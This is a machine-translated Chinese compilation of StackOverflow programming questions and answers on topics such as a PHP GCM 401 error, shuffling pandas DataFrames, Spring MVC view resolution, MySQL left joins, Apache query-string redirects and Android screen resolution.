# StackOverflow 问答 15772000-15772999

# php - 谷歌云消息返回未经授权的php

> ID：15772004
> 
> 赞同：1
> 
> 时间：2013-04-02T18:49:53.553
> 
> 标签：php, google-cloud-messaging

我正在尝试使用 php 向 gcm 发送请求

我发现这篇文章 [GCM with PHP (Google Cloud Messaging)](https://stackoverflow.com/questions/11242743/gcm-with-php-google-cloud-messaging)

我的代码：

```
 public function gcmSend($registrationIdsArray, $messageData) {
    // Replace with real BROWSER API key from Google APIs
    $apiKey = "my key";

    // Replace with real client registration IDs 
    $registrationIDs = $registrationIdsArray;

    // Message to be sent
    $message = $messageData;

    // Set POST variables
    $url = 'https://android.googleapis.com/gcm/send';

    $fields = array(
        'registration_ids' => $registrationIDs,
        'data' => array("message" => $message),
    );

    $headers = array(
        'Authorization: key=' . $apiKey,
        'Content-Type: application/json'
    );

    // Open connection
    $ch = curl_init();

    // Set the url, number of POST vars, POST data
    curl_setopt($ch, CURLOPT_URL, $url);

    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));

    // Execute post
    $result = curl_exec($ch);

    // Close connection
    curl_close($ch);

    return $result;
} 
```

它总是返回：

```
<HTML>
    <HEAD>
        <TITLE>Unauthorized</TITLE>
    </HEAD>
    <BODY BGCOLOR="#FFFFFF" TEXT="#000000">
        <H1>Unauthorized</H1>
        <H2>Error 401</H2>
    </BODY>
</HTML> 
```

对于 api 密钥，我尝试了服务器密钥和浏览器密钥

对于服务器密钥，我设置了 $_SERVER['SERVER_ADDR']; 的结果

如果我的请求是[http://www.api.mysite.com/test](http://www.api.mysite.com/test)我设置的浏览器密钥

```
*.mysite.com/* 
```

密钥可能有激活时间？

我的服务器是互惠服务器，IP可以被列入黑名单吗？

谢谢

# python - 改组/排列熊猫中的DataFrame

> ID：15772009
> 
> 赞同：82
> 
> 时间：2013-04-02T18:50:12.687
> 
> 标签：python, numpy, pandas

在 pandas 中按行或按列对数据帧进行洗牌的简单有效的方法是什么？即如何编写一个函数，该函数`shuffle(df, n, axis=0)`接受一个数据帧、多个 shuffle`n`和一个轴（`axis=0`是行，`axis=1`是列）并返回一个已经被洗牌的数据帧的副本`n`。

**编辑**：关键是在不破坏数据框的行/列标签的情况下做到这一点。如果你只是洗牌`df.index`，就会丢失所有的信息。我希望结果`df`与原始结果相同，只是行的顺序或列的顺序不同。

**Edit2**：我的问题不清楚。当我说洗牌时，我的意思是独立洗牌每一行。因此，如果您有两列`a`and `b`，我希望每一行都自己打乱，这样您就不会像仅将每一行作为一个整体重新排序时那样在`a`and之间具有相同的关联。`b`就像是：

```
for 1...n:
  for each col in df: shuffle column
return new_df 
```

但希望比天真的循环更有效。这对我不起作用：

```
def shuffle(df, n, axis=0):
        shuffled_df = df.copy()
        for k in range(n):
            shuffled_df.apply(np.random.shuffle(shuffled_df.values),axis=axis)
        return shuffled_df

df = pandas.DataFrame({'A':range(10), 'B':range(10)})
shuffle(df, 5) 
```

* * *

## 回答 #1

> 赞同：226
> 
> 时间：2013-04-02T19:09:05.050

使用 numpy 的`random.permuation`功能：

```
In [1]: df = pd.DataFrame({'A':range(10), 'B':range(10)})

In [2]: df
Out[2]:
   A  B
0  0  0
1  1  1
2  2  2
3  3  3
4  4  4
5  5  5
6  6  6
7  7  7
8  8  8
9  9  9

In [3]: df.reindex(np.random.permutation(df.index))
Out[3]:
   A  B
0  0  0
5  5  5
6  6  6
3  3  3
8  8  8
7  7  7
9  9  9
1  1  1
2  2  2
4  4  4 
```

* * *

## 回答 #2

> 赞同：97
> 
> 时间：2016-03-03T22:51:38.233

抽样是随机的，所以只需对整个数据帧进行抽样。

```
df.sample(frac=1) 
```

正如@Corey Levinson 所说，重新分配时必须小心：

```
df['column'] = df['column'].sample(frac=1).reset_index(drop=True) 
```

* * *

## 回答 #3

> 赞同：42
> 
> 时间：2013-04-02T19:10:49.460

```
In [16]: def shuffle(df, n=1, axis=0):     
    ...:     df = df.copy()
    ...:     for _ in range(n):
    ...:         df.apply(np.random.shuffle, axis=axis)
    ...:     return df
    ...:     

In [17]: df = pd.DataFrame({'A':range(10), 'B':range(10)})

In [18]: shuffle(df)

In [19]: df
Out[19]: 
   A  B
0  8  5
1  1  7
2  7  3
3  6  2
4  3  4
5  0  1
6  9  0
7  4  6
8  2  8
9  5  9 
```

* * *

## 回答 #4

> 赞同：21
> 
> 时间：2016-08-11T17:40:15.687

您可以使用 [`sklearn.utils.shuffle()`](http://scikit-learn.org/stable/modules/generated/sklearn.utils.shuffle.html)（[需要](https://github.com/scikit-learn/scikit-learn/issues/4008)sklearn 0.16.1 或更高版本来支持 Pandas 数据帧）：

```
# Generate data
import pandas as pd
df = pd.DataFrame({'A':range(5), 'B':range(5)})
print('df: {0}'.format(df))

# Shuffle Pandas data frame
import sklearn.utils
df = sklearn.utils.shuffle(df)
print('\n\ndf: {0}'.format(df)) 
```

输出：

```
df:    A  B
0  0  0
1  1  1
2  2  2
3  3  3
4  4  4

df:    A  B
1  1  1
0  0  0
3  3  3
4  4  4
2  2  2 
```

[`df.reset_index()`](http://pandas.pydata.org/pandas-docs/stable/generated/pandas.DataFrame.reset_index.html)然后，如果需要，您可以使用重置索引列：

```
df = df.reset_index(drop=True)
print('\n\ndf: {0}'.format(df) 
```

输出：

```
df:    A  B
0  1  1
1  0  0
2  4  4
3  2  2
4  3  3 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2017-11-04T15:40:37.797

pandas 中的一个简单解决方案是`sample`在每一列上独立使用该方法。用于`apply`遍历每一列：

```
df = pd.DataFrame({'a':[1,2,3,4,5,6], 'b':[1,2,3,4,5,6]})
df

   a  b
0  1  1
1  2  2
2  3  3
3  4  4
4  5  5
5  6  6

df.apply(lambda x: x.sample(frac=1).values)

   a  b
0  4  2
1  1  6
2  6  5
3  5  3
4  2  4
5  3  1 
```

您必须使用`.value`这样才能返回一个 numpy 数组而不是一个系列，否则返回的系列将与原始 DataFrame 对齐而不改变任何东西：

```
df.apply(lambda x: x.sample(frac=1))

   a  b
0  1  1
1  2  2
2  3  3
3  4  4
4  5  5
5  6  6 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2016-02-24T19:07:30.507

从文档使用`sample()`：

```
In [79]: s = pd.Series([0,1,2,3,4,5])

# When no arguments are passed, returns 1 row.
In [80]: s.sample()
Out[80]: 
0    0
dtype: int64

# One may specify either a number of rows:
In [81]: s.sample(n=3)
Out[81]: 
5    5
2    2
4    4
dtype: int64

# Or a fraction of the rows:
In [82]: s.sample(frac=0.5)
Out[82]: 
5    5
4    4
1    1
dtype: int64 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2014-02-01T20:08:28.517

我采取了稍微调整@root 的答案并直接使用原始值。当然，这意味着您失去了进行精美索引的能力，但它非常适合仅对数据进行洗牌。

```
In [1]: import numpy

In [2]: import pandas

In [3]: df = pandas.DataFrame({"A": range(10), "B": range(10)})    

In [4]: %timeit df.apply(numpy.random.shuffle, axis=0)
1000 loops, best of 3: 406 µs per loop

In [5]: %%timeit
   ...: for view in numpy.rollaxis(df.values, 1):
   ...:     numpy.random.shuffle(view)
   ...: 
10000 loops, best of 3: 22.8 µs per loop

In [6]: %timeit df.apply(numpy.random.shuffle, axis=1)
1000 loops, best of 3: 746 µs per loop

In [7]: %%timeit                                      
for view in numpy.rollaxis(df.values, 0):
    numpy.random.shuffle(view)
   ...: 
10000 loops, best of 3: 23.4 µs per loop 
```

请注意，`numpy.rollaxis`将指定的轴带到第一个维度，然后让我们迭代具有剩余维度的数组，即，如果我们想沿着第一个维度（列）打乱，我们需要将第二个维度滚动到前面，这样我们将洗牌应用于第一维的视图。

```
In [8]: numpy.rollaxis(df, 0).shape
Out[8]: (10, 2) # we can iterate over 10 arrays with shape (2,) (rows)

In [9]: numpy.rollaxis(df, 1).shape
Out[9]: (2, 10) # we can iterate over 2 arrays with shape (10,) (columns) 
```

然后，您的最终函数使用技巧使结果符合将函数应用于轴的期望：

```
def shuffle(df, n=1, axis=0):     
    df = df.copy()
    axis = int(not axis) # pandas.DataFrame is always 2D
    for _ in range(n):
        for view in numpy.rollaxis(df.values, axis):
            numpy.random.shuffle(view)
    return df 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2014-08-14T23:48:12.780

当您希望对索引进行洗牌时，这可能会更有用。

```
def shuffle(df):
    index = list(df.index)
    random.shuffle(index)
    df = df.ix[index]
    df.reset_index()
    return df 
```

它使用新索引选择新的df，然后重置它们。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2017-06-21T21:18:47.780

我知道问题是针对`pandas`df 但如果随机发生按行（列顺序已更改，行顺序未更改），那么列名称不再重要，使用 an 可能会很有趣`np.array`，那么`np.apply_along_axis()`您将正在找。

如果这是可以接受的，那么这将是有帮助的，请注意很容易切换数据被洗牌的轴。

如果您的熊猫数据框名为`df`，也许您可​​以：

1.  获取数据框的值`values = df.values`，
2.  创建一个`np.array`从`values`
3.  应用下面显示的方法来洗牌`np.array`按行或列
4.  从 shuffled 重新创建一个新的（shuffled）pandas df`np.array`

### 原始数组

```
a = np.array([[10, 11, 12], [20, 21, 22], [30, 31, 32],[40, 41, 42]])
print(a)
[[10 11 12]
 [20 21 22]
 [30 31 32]
 [40 41 42]] 
```

### 保持行顺序，每行内的列洗牌

```
print(np.apply_along_axis(np.random.permutation, 1, a))
[[11 12 10]
 [22 21 20]
 [31 30 32]
 [40 41 42]] 
```

### 保持列顺序，在每列中随机排列行

```
print(np.apply_along_axis(np.random.permutation, 0, a))
[[40 41 32]
 [20 31 42]
 [10 11 12]
 [30 21 22]] 
```

### 原始数组不变

```
print(a)
[[10 11 12]
 [20 21 22]
 [30 31 32]
 [40 41 42]] 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-06-23T19:28:19.967

如果您只想对 DataFrame 的一个子集进行洗牌，这是我发现的一种解决方法：

```
shuffle_to_index = 20
df = pd.concat([df.iloc[np.random.permutation(range(shuffle_to_index))], df.iloc[shuffle_to_index:]]) 
```

# html - IE 表单输入元素未根据 HTML5 规范动态添加到 Window 对象

> ID：15772013
> 
> 赞同：0
> 
> 时间：2013-04-02T18:50:21.187
> 
> 标签：html, internet-explorer, dom

根据 HTML 规范（[http://www.w3.org/TR/html5/browsers.html#named-access-on-the-window-object](http://www.w3.org/TR/html5/browsers.html#named-access-on-the-window-object)），窗口对象应该动态包含页面中的元素被“命名”。在我的例子中，具有关联的 id 属性的输入元素应该存在于 Window 对象上。

但是，根据下面的 HTML（通过 HTML5 验证），如果输入元素位于表单元素下方，IE 将无法通过它在窗口对象上的 id 识别输入元素。

以下 HTML 将在 IE8 和 IE10 中显示“对象”警报，然后显示“未定义”警报。为什么？在 FireFox 和 Google Chrome 中，它显示“对象”的两个警报。有什么我想念的吗？

```
<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>HTML5 Standards mode</title>
    </head>
    <body>
        <input type="button" id="outerbutton" value="outer button">
        <form>
            <input type="button" id="innerbutton" value="inner button">
        </form>
        <script>
            window.onload = function(e)
            {
                alert(typeof outerbutton);
                alert(typeof innerbutton);
            };
        </script>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:45:18.180

`outerbutton`asnd`innerbutton`不会自动成为全局 JavaScript 变量，只是因为您添加了一些恰好包含具有相同 ID 的元素的 HTML。

您需要使用 DOM 方法来获取元素：`document.getElementById('outerbutton')`

另外，您的元素未**命名**。您正在使用 ID。

如果您使用过：

```
<input type="button" name="pinky" id="outerbutton" value="outer button"> 
```

你可以使用

```
alert(document.forms[0].pinky.value); 
```

...但这要求元素是表单集合的成员。所以这将适用于“innerbutton”而不是“outerbutton”。

# spring-mvc - Spring 3 MVC——请求的资源不可用

> ID：15772018
> 
> 赞同：0
> 
> 时间：2013-04-02T18:50:28.273
> 
> 标签：spring-mvc, http-status-code-404

当我调用它时，我的 Spring JSP 没有出现。显然资源不可用。这是我的控制器代码。

```
@Controller
public class BulletinsController {
    private List<Bulletin> bulletins;
    private BulletinDAO bulletinDAO;

    // getters and setters, including autowiring for the BulletinDAO

    @RequestMapping(value = "/getApprovedBulletins", method = RequestMethod.POST)
    public ModelAndView getApprovedBulletins() {
        try {
            bulletins = bulletinDAO.getApprovedBulletins();
            mav.setViewName("WEB-INF/jsp/EnterBulletin");
            if (bulletins != null) {
                mav.addObject("bulletins", bulletins);
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
            mav.setViewName("WEB-INF/jsp/FailurePage");
        }

        return mav;
    } 
```

这是 jcbulboard-servlet.xml 的相关部分

```
 <bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
        <property name="driverClassName" value="com.mysql.jdbc.Driver" />
        <property name="url" value="jdbc:mysql://localhost/cpc" />
    </bean>

    <bean id="bulletinDAO" class="com.dao.BulletinDAO">
        <property name="dataSource" ref="dataSource" />
    </bean>

    <bean id="bulletinsController" class="com.controller.BulletinsController">
        <property name="bulletinDAO" ref="bulletinDAO" />
    </bean> 
```

这是我的 web.xml。

```
 <?xml version="1.0" encoding="UTF-8"?>
    <web-app id="WebApp_ID" version="2.4"
        xmlns="http://java.sun.com/xml/ns/j2ee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
        <display-name>Job Connections Bulletin Board</display-name>

        <servlet>
            <servlet-name>jcbulboard</servlet-name>
            <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
            <load-on-startup>1</load-on-startup>
        </servlet>

        <servlet-mapping>
            <servlet-name>jcbulboard</servlet-name>
            <url-pattern>/</url-pattern>
        </servlet-mapping>

        <welcome-file-list>
            <welcome-file>Welcome.jsp</welcome-file>
        </welcome-file-list>
</web-app> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:32:53.293

尝试将视图解析器添加到您的`jcbulboard-servlet.xml`：

```
 <bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="prefix" value="/WEB-INF/jsp/" />
        <property name="suffix" value=".jsp" />
    </bean> 
```

代替

```
mav.setViewName("WEB-INF/jsp/FailurePage"); 
```

这将是

```
mav.setViewName("FailurePage"); 
```

假设有一个文件名为：

```
WEB-INF/jsp/FailurePage.jsp 
```

# sql-server - 是否有任何内置机制来排队 SQL 查询，而不是使用 NOWAIT 或 SET LOCKTIMEOUT

> ID：15772028
> 
> 赞同：0
> 
> 时间：2013-04-02T18:51:00.653
> 
> 标签：sql-server, sql-server-2008, transactions, locking, nolock

假设我有一个事务正在运行，同时我想在另一个连接中执行一组 SQL 查询 (SELECT)。

我可以使用 来做到这一点`SET LOCKTIMEOUT`，但为此我必须给出一个超时值。在我的情况下，它会有所不同，所以我不能使用固定的毫秒。

当我得到一个`LockTimeOut Error`.

SQL Server 2008/2012 中是否有任何内置功能？

# c# - 如何在 C# 中解析非常大的 XML 文件？

> ID：15772031
> 
> 赞同：13
> 
> 时间：2013-04-02T18:51:10.387
> 
> 标签：c#, xml, parsing

我正在使用 dblp XML 文件。我实际上想解析 dblp.xml 文件，并想提取有用的信息以供我在某些项目中进一步处理。而且那个 XML 文件非常大（1.1 GB），我什至无法打开这个文件。

如果你有 dblp.xml 的 C# 解析器，请指导我，或者你可以指导我关于这个，或者关于我们如何解析巨大的 xml 文件。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-02T19:02:33.720

使用 XML 阅读器而不是 XML dom。XML dom 将整个文件存储在内存中，这完全没用：

[http://msdn.microsoft.com/en-us/library/system.xml.xmlreader.aspx](http://msdn.microsoft.com/en-us/library/system.xml.xmlreader.aspx)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-02T19:06:19.627

你需要使用[`XmlReader`](http://msdn.microsoft.com/en-us/library/system.xml.xmlreader.aspx)

它代表提供对数据的快速、非缓存、只进访问的读取器`XML`。**不会将所有数据加载到内存中**，应该用于大量数据。其他内置`.NET`解决方案保留完整生成的对象图。

[XmlReader 在行动（由 Jon Skeet）](https://stackoverflow.com/questions/2441673/reading-xml-with-xmlreader-in-c-sharp)

# android - 可以将 PreferenceActivity 与自定义 HashMap 一起用作 Android 中的设置存储吗？

> ID：15772035
> 
> 赞同：0
> 
> 时间：2013-04-02T18:51:20.177
> 
> 标签：android, settings, preferenceactivity

我在其他平台上的应用程序上使用 json 文件进行设置。由于我想保持流程相似，我移植了我的自定义设置解决方案（它将键保存在 HashMap 中并保存到/从 json 文件中恢复。它工作得很好。

现在，是时候为设置绘制界面了。我有两个选择：

**a)**构建自定义 ListView 并根据其设置手动管理行。（基本上有点类似于重新实现从 xml 读取的 PreferenceActivity）

**b）**使用不带任何 xml 的 PreferenceActivity（全部在 java 代码中），但将任何更改保存到我自己的设置存储而不是 SharedPreferences..

如果我尝试通过 PreferenceActivity 管理设置，是否可以使用替代存储来保存设置？

*   **如果是这样**，如何拦截并重定向到 MySettings.save(..) 函数，而不是 SharedPreferences 的保存函数。
*   **如果没有**，我应该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T18:56:39.760

可以使用任何有用的东西，它是你的应用程序。标准是使用 SharedPreferences，它内置在 Preferences 中（它们会自动保存到磁盘），并且可以在其他活动中轻松读取/更改。为什么不需要在 HashMaps 中编写代码并自定义导出/导入到磁盘？

# ruby-on-rails - 创建哈希迭代对象数组

> ID：15772036
> 
> 赞同：18
> 
> 时间：2013-04-02T18:51:21.877
> 
> 标签：ruby-on-rails, ruby

我有一个具有属性的对象`name`和`data`等等。我想创建一个使用名称作为键和数据（这是一个数组）作为值的哈希。我不知道如何使用`map`. 是否可以？

```
def fc_hash
  fcs = Hash.new
  self.forecasts.each do |fc|
    fcs[fc.name] = fc.data
  end
  fcs
end 
```

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-04-02T18:55:43.557

使用[`Hash[]`](http://ruby-doc.org/core-2.0/Hash.html#method-c-5B-5D)：

```
Forecast = Struct.new(:name, :data)
forecasts = [Forecast.new('bob', 1), Forecast.new('mary', 2)]
Hash[forecasts.map{|forecast| [forecast.name, forecast.data]}]
# => {"mary"=>2, "bob"=>1} 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-04-02T18:56:10.837

```
def fc_hash
 forecasts.each_with_object({}) do |forecast, hash|
    hash[forecast.name] = forecast.data
  end
end 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-02T19:53:59.370

我总是使用`inject`or`reduce`为此：

```
self.forecasts.reduce({}) do |h,e|
  h.merge(e.name => e.data)
end 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-02T18:58:46.703

```
Hash[*self.forecases.map{ [fc.name, fc.data]}.flatten] 
```

# apache - Apache .htaccess 重定向包含参数的 URL 目录

> ID：15772042
> 
> 赞同：0
> 
> 时间：2013-04-02T18:51:39.857
> 
> 标签：apache, .htaccess, mod-rewrite

很抱歉成为另一个乏味的 mod_rewrite 问题的提问者，但在过去几个小时没有取得任何进展之后，我认为是时候提问了；）

我正在尝试重定向这样的 URL：

/some/thing?a=1 --> [http://something-else.com/blah](http://something-else.com/blah)

/some/thing?a=1&b=whatever --> [http://something-else.com/blah2](http://something-else.com/blah2)

无需保留参数值 - 新 URL 将为我必须重定向的每个 URL 进行硬编码。

尝试了一些与其他帖子不同的东西，但没有任何乐趣，所以我回到了原点，所以任何建议都会受到欢迎。

谢谢！:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:00:08.620

您可以使用以下规则集：

```
RewriteEngine On

RewriteCond %{QUERY_STRING} ^a=1$
RewriteRule /some/thing http://something-else.com/blah [L] 
```

这确实是一个很常见的问题，人们往往会忽略这个`QUERY_STRING`变量。你以前试过吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-07T12:08:08.557

这是我最后使用的：

重写引擎开启

RewriteCond %{QUERY_STRING} ^(a=1&b=whatever)$

RewriteRule /some/thing [http://something-else.com/blah2](http://something-else.com/blah2) [L,R=301]

我在底部添加规则，而不是在阻止它工作的“RewriteEngine On”正下方。

这个解决方案仍然将参数附加到[http://something-else.com/blah2](http://something-else.com/blah2)这不是我想要的，但它会做。

# mysql - 如何在 mysql 连接中选择可能不存在的行

> ID：15772049
> 
> 赞同：0
> 
> 时间：2013-04-02T18:52:03.713
> 
> 标签：mysql, sql, join

我有两个表需要加入一个需要返回单行的查询。从一个表中，我将选择永远存在的行。从第二个开始，我需要选择两行，其中之一将始终存在，而另一行仅有时存在。

我可以在第二个表中的两行都存在但第二行不存在的情况下进行这项工作。

这是我的架构的简化示例

表 1：公司

```
COMPANY_ID int

------------
|COMPANY_ID|
------------
|         1|
|         2|
------------ 
```

表 2：偏好

```
COMPANY_ID int,
PREFERENCE_ID int,
PREFERENCE_VALUE varchar

-------------------------------------------
|COMPANY_ID|PREFERENCE_ID|PREFERENCE_VALUE|
-------------------------------------------
|         1|            1|             foo|
|         1|            2|             bar|
|         2|            1|             baz|
------------------------------------------- 
```

我正在寻找的是一个查询，该查询将在 COMPANY_ID = 1 时返回具有 PREFERENCE_ID 的行，在 COMPANY_ID = 2 时返回具有一个 PREFERENCE_ID 和空单元格（或零或任何默认值）的行。

我正在尝试使用类似的查询

```
select c.*, p1.PREFERENCE_VALUE as VALUE1, p2.PREFERENCE_VALUE as VALUE2 
  from 
    COMPANIES 
    join PREFERENCES p1 on c.ID = p1.COMPANY_ID 
    join PREFERENCES p2 on c.ID = p2.COMPANY_ID 
   where 
     p1.PREFERENCE_ID = 1 and 
     p2.PREFERENCE_ID = 2 and 
     COMPANIES.ID = 1; 
```

当我使用 COMPANY_ID = 1 运行此查询时（其中有 PREFERENCE_ID 1*和*2，它工作正常。当我使用 COMPANY_ID = 2 运行它时，它返回一个空集。我尝试使用左连接进行第二次连接，但这并没有不要改变任何东西。

我希望它返回：

COMPANY_ID = 1 在查询中：

```
------------------
|ID|VALUE1|VALUE2|
------------------
| 1|   foo|   bar|
------------------ 
```

对于 COMPANY_ID=2，它可以为 VALUE2 返回任何内容。null，空白，0，我不在乎：

```
------------------
|ID|VALUE1|VALUE2|
------------------
| 2|   baz|      |
------------------ 
```

TIA 的任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T18:55:47.510

问题是`WHERE`条款。`LEFT JOIN`将返回空值并准确生成您正在寻找的内容，但`WHERE`您的查询中的 否定了这一点。

```
select c.*, p1.PREFERENCE_VALUE as VALUE1, p2.PREFERENCE_VALUE as VALUE2 
  from 
    COMPANIES 
    inner join PREFERENCES p1 
      on c.ID = p1.COMPANY_ID and p1.PREFERENCE_VALUE = 1
    left outer join PREFERENCES p2 
      on c.ID = p2.COMPANY_ID and p2.PREFERENCE_VALUE = 2
   where 
     COMPANIES.ID = 1; 
```

# geb - 来自 ConfigSlurper 的 Geb 页面 url 方法

> ID：15772052
> 
> 赞同：0
> 
> 时间：2013-04-02T18:52:12.657
> 
> 标签：geb

我正在尝试将我需要的 url 存储在使用 ConfigSlurper 提取的配置文件中。我认为这可能行不通，但不确定。想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T13:53:25.583

您可能正在寻找由[baseUrl](http://www.gebish.org/manual/current/browser.html#the_base_url)配置提供的功能。当使用`to MyPage`浏览器使用的 url 时，通过结合`basUrl`配置和`url`页面类的属性来确定。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-22T09:22:45.820

如果您想要一种更简洁的方法来执行此操作，您可以实现如下所示的基页面 - 为简洁起见并避免直接调用受保护方法的内部类 - （我们在 26 个不同的子域上有应用程序！）：

```
package page.admin

import geb.Configuration
import geb.Page

class AdminPage extends Page {

    class WrappedConfig extends Configuration {

        WrappedConfig(ConfigObject rawConfig) {
            super(rawConfig)
        }

        String getAdminBaseUrl() {
            return readValue('adminUrl', '<invalid-url>')
        }

    }

    String getPageUrl() {
        WrappedConfig config = new WrappedConfig(browser.config.rawConfig)
        return config.adminBaseUrl + this.class.url
    }

} 
```

您的配置可能如下所示：

```
baseUrl = 'http://base-app.example.net'
adminUrl = 'http://admin-app.example.com' 
```

这样，您仍然可以使用普通的 geb 语法：

```
given:
    to PageWhichExtendsAdminPage, 'your-path', key1: 'value1 
```

生成网址`http://admin-app.example.com/your-path/?key1=value1`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-30T20:21:02.080

我在不同的语言环境中运行 geb，所以我遇到了同样的问题。我通常使用 locale.getCountry() 作为环境参数从配置文件中加载不同的 url。

在正在运行的类中，我将 baseUrl 替换为使用 ConfigSlurper 加载的条目。优点是我可以处理多个语言环境和本地主机环境。在本地测试与测试暂存环境。

我有一个包含整个回归测试的主 spock 文件和每个国家/地区的继承 spock 类。除了类名中的国家/语言编码之外，继承的 spock 文件不包含太多内容。

配置文件：

```
environment{
  CA{
    url="ca.somewhere.com"
    validZipCode=...
    ...
  }
  ...
} 
```

主要类：

```
class MainRegression extends GebReportingSpec{

@Shared Locale locale

def setupSpec(){
  ...
  locale = ParameterReader.getLocale(this.class.name)
  ...
}

def "testing the website"(){
  when: "entering the main url"
  go URLService.getBaseUrl(locale)
  ...

} 
```

继承类：

```
@Stepwise
class CaEnRegressionSpec{} // Canada with english language 
```

使用不同语言/语言环境处理验证时的好方法：http: [//ldaley.com/post/1013531080/painless-page-identification-with-geb-grails](http://ldaley.com/post/1013531080/painless-page-identification-with-geb-grails)

# c# - 如何在 MVC 4 的部分视图中访问动态 linq 查询的结果（PredicateBuilder linq 到实体）？

> ID：15772065
> 
> 赞同：0
> 
> 时间：2013-04-02T18:52:53.713
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-4, viewdata

我有一个控制器操作，它使用 PredicateBuilder 构建动态 linq 查询。我想将此查询的结果传递给部分视图。做这个的最好方式是什么？如果始终使用强类型视图是最佳实践，我传递给控制器​​操作的视图模型是否应该有一个可以将查询结果传递到的列表？或者这只是使用两个列表的额外开销？

这是控制器操作的简化版本：

```
[HttpPost]
public ActionResult BasicPropertySearch(BasicPropertySearchViewModel viewModel)
{
    var predicate = PredicateBuilder.True<ResidentialProperty>();
    if (ModelState.IsValid)
    {
        using(var db = new LetLordContext())
        {
            predicate = predicate.And(x => x.HasBackGarden);
            predicate = predicate.And(x => x.HasFrontGarden);
            predicate = predicate.And(x => x.HasSecureParking);
            predicate = predicate.And(x => x.IsDisabledFriendly);

            var results = db.ResidentialProperty.AsExpandable().Where(
            predicate).ToList();

            return PartialView("_BasicPropertySearchResultsPartial", results);
        }

    }
    ModelState.AddModelError("", "Something went wrong...");
    return View("_BasicPropertySearchPartial");
} 
```

`results`如果传递给列表的视图不是强类型的，我如何在视图中访问？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T18:58:02.123

您应该尽可能使用强类型视图模型，但是您可以在局部视图中使用“动态”模型来访问您的数据。或者更常规地在控制器和视图中使用 Viewbag 动态对象来传递数据：

[http://weblogs.asp.net/hajan/archive/2010/12/11/viewbag-dynamic-in-asp-net-mvc-3-rc-2.aspx](http://weblogs.asp.net/hajan/archive/2010/12/11/viewbag-dynamic-in-asp-net-mvc-3-rc-2.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T18:59:12.487

强类型视图是首选方法。您还可以通过 Viewbag 对象将数据传递给视图，并在视图本身中引用 Viewbag。

# android - Android自定义分辨率1920x1200

> ID：15772067
> 
> 赞同：0
> 
> 时间：2013-04-02T18:52:55.873
> 
> 标签：android, screen, resolution

我正在为 Asus Transformer Infinity Pad 构建一个 Android 应用程序。
**我不使用 Emulator**，而是直接使用平板电脑。
我正在使用 1280x800 的最大可能分辨率（我从编辑器菜单中选择），它在 Eclipse 图形编辑器和平板电脑本身上看起来都不错。

显然，我发现平板电脑的分辨率是 HD 1920x1200。由于我想获得平板电脑的大部分分辨率，我想在编辑器和平板电脑上都使用 1920x1200。

**1\. 如何在Eclipse Graphic Editor（不是模拟器）中设置自定义分辨率为1920x1200？**
**2\. 如何告诉平板电脑本身以 1920x1200 分辨率工作？**

谢谢

=====================
*操作系统：Android 4.2.2
SDK：API 17
平板电脑：华硕Transformer Infinity Pad TF700T*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:08:51.710

**1\. 如何在Eclipse中设置自定义分辨率为1900x1200？**
可能[重复](https://stackoverflow.com/questions/5383788/screen-size-in-eclipse-simulator#)：

> 在 Eclipse 中，如果在 Window 下拉菜单中选择 Android SDK 和 AVD Manager。您应该可以在那里更改 Android 虚拟设备（模拟器）的屏幕大小。

**2\. 如何让平板电脑本身以 1900x1200 分辨率工作？**
我假设你的意思是 1920x1200，但我仍然不完全确定你在这里问什么。Asus Transformer Infinity Pad TF700T 的默认分辨率为 1920x1200。

如果您确实是指 1900x1200，并且您想将 TF700T 的分辨率强制为 1900x1200，那恐怕您就不走运了。我不认为这是可能的，我真的不明白你为什么想要这个。

如果您的设备已植根，则有一些应用程序可以更改您的屏幕分辨率，但我不确定是否支持 TF700T。诸如此类的应用[程序](https://play.google.com/store/apps/details?id=com.birdapi.android.dpi&hl=en)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:20:29.377

1.  如何在 Eclipse 中设置 1900x1200 的自定义分辨率？

无需为您的日食设置任何分辨率

使用您的正常 x-large mdpi 分辨率让我们说

```
 x-large-mdpi 1280 x 800  =1 
 x-large-hdpi 1920 x 1200  =1.5 
 x-large-xdpi 2560 x 1600  =2 
```

